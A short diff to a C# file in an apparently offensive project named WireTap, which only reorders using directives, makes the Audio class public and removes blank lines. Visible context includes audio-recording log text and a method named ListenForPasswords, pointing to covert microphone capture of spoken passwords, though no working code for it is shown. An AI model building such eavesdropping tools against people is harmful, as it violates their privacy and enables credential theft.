@@ -1,17 +1,17 @@
-﻿using System;
-using NAudio.Wave;
-using System.IO;
-using System.Threading;
-using System.Runtime.InteropServices;
-using System.Text;
-using NAudio.Wave.SampleProviders;
-//using Microsoft.Speech.Recognition;
-//using Microsoft.Speech.Synthesis;
-using System.Speech.Recognition;
-
-namespace WireTap
+﻿namespace WireTap
 {
-    class Audio
+    using System;
+    using NAudio.Wave;
+    using System.IO;
+    using System.Threading;
+    using System.Runtime.InteropServices;
+    using System.Text;
+    using NAudio.Wave.SampleProviders;
+    //using Microsoft.Speech.Recognition;
+    //using Microsoft.Speech.Synthesis;
+    using System.Speech.Recognition;
+
+    public class Audio
     {
         static bool done = false;
         static bool speechOn = true;
@@ -61,11 +61,7 @@ namespace WireTap
         //        Console.WriteLine("[!] Finished recording. File at: {0}", fname);
         //    }
         //}
-
-
         // END MICROSOFT.SPEECH
-
-
 
         public static void ListenForPasswords(Choices ch = null)
         {
